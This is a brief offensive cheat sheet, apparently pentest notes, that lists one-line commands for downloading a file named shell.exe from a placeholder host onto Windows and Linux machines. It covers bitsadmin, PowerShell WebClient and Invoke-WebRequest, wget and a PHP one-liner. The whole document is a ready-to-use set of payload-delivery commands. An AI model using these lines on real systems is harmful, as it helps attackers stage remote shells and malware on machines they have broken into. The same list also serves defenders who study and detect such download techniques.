# Windows

### CMD
```cmd
bitsadmin /transfer shell /priority high http://example.com/shell.exe c:\temp\shell.exe
```

### PowerShell
```powershell
powershell -command "& {(New-Object Net.WebClient).DownloadFile('http://example.com/shell.exe','c:\temp\shell.exe')}"
```
```powershell
Invoke-WebRequest http://example.com/shell.exe -OutFile shell.exe -UseBasicParsing
```

# Linux

### Bash
```bash
wget http://example.com/shell.exe
```

# General

### PHP
```php
php -e 'file_put_contents("shell.exe",file_get_contents("http://example.com/shell.exe"));'
```
